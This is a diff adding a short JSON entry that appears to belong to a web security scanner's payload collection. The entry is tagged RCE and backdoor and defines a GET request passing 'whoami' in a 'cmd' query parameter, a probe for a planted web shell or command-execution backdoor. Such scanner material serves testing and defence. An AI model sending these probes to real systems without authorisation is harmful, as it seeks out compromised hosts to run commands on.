@@ -1,0 +1,16 @@
+{
+    "categories":["RCE","BACKDOOR"],
+    "tags": ["whoami","rce","cmd","execution", "code execution","remote code execution"],
+    "description":"common RCE payload thorough a backdoor",
+    "payload":
+        {
+        "method":"GET",
+        "headers":{},
+        "body":{},
+        "query":
+            {
+            "cmd":"whoami"
+            }
+        }
+    }
+    
